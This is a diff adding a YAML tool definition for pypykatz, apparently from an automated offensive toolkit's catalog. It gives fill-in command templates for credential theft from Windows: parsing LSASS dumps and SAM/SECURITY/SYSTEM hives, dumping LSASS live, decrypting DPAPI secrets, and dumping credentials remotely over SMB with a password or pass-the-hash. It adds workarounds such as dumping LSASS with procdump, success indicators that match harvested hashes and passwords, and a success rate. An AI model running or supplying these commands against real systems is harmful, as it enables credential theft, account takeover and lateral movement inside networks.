@@ -1,0 +1,176 @@
+name: pypykatz
+version: "0.6.8"
+category: windows_exploitation
+description: "Pure Python implementation of Mimikatz for credential extraction from Windows memory dumps and registry hives"
+
+capabilities:
+  - lsass_dump_parsing
+  - credential_extraction
+  - ntlm_hash_extraction
+  - kerberos_ticket_extraction
+  - dpapi_secrets
+  - registry_parsing
+  - sam_dump
+  - security_hive_parsing
+  - system_hive_parsing
+  - remote_registry
+  - live_lsass_dump
+  - memory_dump_analysis
+
+target_compatibility:
+  os: [linux, macos, windows]
+  versions:
+    linux: ["Ubuntu 18.04+", "Debian 10+", "Kali 2020+"]
+    macos: ["macOS 10.13+"]
+    windows: ["Windows 7+"]
+  architecture: [x86_64]
+  target_systems: ["Windows XP+", "Windows Server 2003+"]
+
+commands:
+  - name: parse_lsass_minidump
+    description: "Parse LSASS minidump file"
+    template: "pypykatz lsa minidump {minidump_file}"
+    parameters:
+      minidump_file: {type: path, required: true}
+    example: "pypykatz lsa minidump lsass.dmp"
+    
+  - name: live_lsass_dump
+    description: "Dump LSASS from live system (requires admin)"
+    template: "pypykatz live lsa"
+    parameters: {}
+    example: "pypykatz live lsa"
+    
+  - name: parse_registry
+    description: "Parse SAM, SECURITY, SYSTEM registry hives"
+    template: "pypykatz registry --sam {sam_file} --security {security_file} --system {system_file}"
+    parameters:
+      sam_file: {type: path, required: true}
+      security_file: {type: path, required: true}
+      system_file: {type: path, required: true}
+    example: "pypykatz registry --sam SAM --security SECURITY --system SYSTEM"
+    
+  - name: parse_rekall
+    description: "Parse Rekall memory dump"
+    template: "pypykatz rekall {rekall_file}"
+    parameters:
+      rekall_file: {type: path, required: true}
+    example: "pypykatz rekall memory.rekall"
+    
+  - name: lsass_json_output
+    description: "Parse LSASS dump with JSON output"
+    template: "pypykatz lsa minidump {minidump_file} -o {output_file}"
+    parameters:
+      minidump_file: {type: path, required: true}
+      output_file: {type: path, required: true}
+    example: "pypykatz lsa minidump lsass.dmp -o creds.json"
+    
+  - name: dpapi_masterkey
+    description: "Extract DPAPI masterkeys"
+    template: "pypykatz dpapi masterkey {masterkey_file}"
+    parameters:
+      masterkey_file: {type: path, required: true}
+    example: "pypykatz dpapi masterkey masterkey_file"
+    
+  - name: dpapi_credential
+    description: "Decrypt DPAPI credential file"
+    template: "pypykatz dpapi credential {credential_file} {masterkey}"
+    parameters:
+      credential_file: {type: path, required: true}
+      masterkey: {type: str, required: true}
+    example: "pypykatz dpapi credential cred.bin masterkey_hex"
+    
+  - name: kerberos_kirbi
+    description: "Parse Kerberos .kirbi ticket file"
+    template: "pypykatz kerberos kirbi {kirbi_file}"
+    parameters:
+      kirbi_file: {type: path, required: true}
+    example: "pypykatz kerberos kirbi ticket.kirbi"
+    
+  - name: remote_smb_dump
+    description: "Dump credentials via SMB (requires auth)"
+    template: "pypykatz smb -u {username} -p {password} -t {target}"
+    parameters:
+      username: {type: str, required: true}
+      password: {type: str, required: true, sensitive: true}
+      target: {type: ip, required: true}
+    example: "pypykatz smb -u admin -p pass -t 10.10.10.10"
+    
+  - name: remote_smb_with_hash
+    description: "Dump credentials via SMB with hash"
+    template: "pypykatz smb -u {username} --hashes {hash} -t {target}"
+    parameters:
+      username: {type: str, required: true}
+      hash: {type: str, required: true, sensitive: true}
+      target: {type: ip, required: true}
+    example: "pypykatz smb -u admin --hashes aad3b435b51404eeaad3b435b51404ee:hash -t 10.10.10.10"
+    
+  - name: parse_all_formats
+    description: "Auto-detect and parse any supported format"
+    template: "pypykatz parse {file}"
+    parameters:
+      file: {type: path, required: true}
+    example: "pypykatz parse memory.dmp"
+
+output_format:
+  type: text
+  log_format: text
+  supports_json: true
+
+requires_auth: false
+requires_root: true
+ports_required: []
+
+supersedes: []
+complements: [impacket, crackmapexec, mimikatz]
+
+known_issues:
+  - issue: "Live LSASS dump requires admin/SYSTEM privileges"
+    impact: high
+    workaround: "Dump LSASS with other tools first (procdump, sqldumper)"
+  - issue: "Some DPAPI operations need additional context"
+    impact: medium
+    workaround: "Extract DPAPI masterkeys and passwords separately"
+  - issue: "Limited compared to native Mimikatz on Windows"
+    impact: medium
+    workaround: "Use in combination with other credential tools"
+  - issue: "Memory dump parsing may fail on corrupted dumps"
+    impact: low
+    workaround: "Ensure clean memory dump with proper tools"
+
+success_indicators:
+  - "Username:"
+  - "Domain:"
+  - "NT:"
+  - "LM:"
+  - "Password:"
+  - "Kerberos:"
+  - "== MSV =="
+  - "== WDIGEST =="
+  - "== Kerberos =="
+  - "== DPAPI =="
+
+failure_indicators:
+  - "ERROR"
+  - "Failed to parse"
+  - "Access denied"
+  - "Insufficient privileges"
+  - "Could not open file"
+  - "Invalid minidump"
+  - "No credentials found"
+
+installation:
+  pip: "pip install pypykatz"
+  github: "git clone https://github.com/skelsec/pypykatz && cd pypykatz && pip install ."
+  verify: "pypykatz version"
+  post_install:
+    - "For live dumping on Windows: Ensure admin privileges"
+    - "For Linux analysis: No additional requirements"
+    - "Test with sample: pypykatz lsa minidump sample.dmp"
+
+effectiveness_baseline:
+  success_rate: 0.88
+  avg_execution_time: 10
+  false_positive_rate: 0.02
+  resource_usage: low
+  reliability: high
+  notes: "Essential for credential extraction; works great with memory dumps from Windows targets"
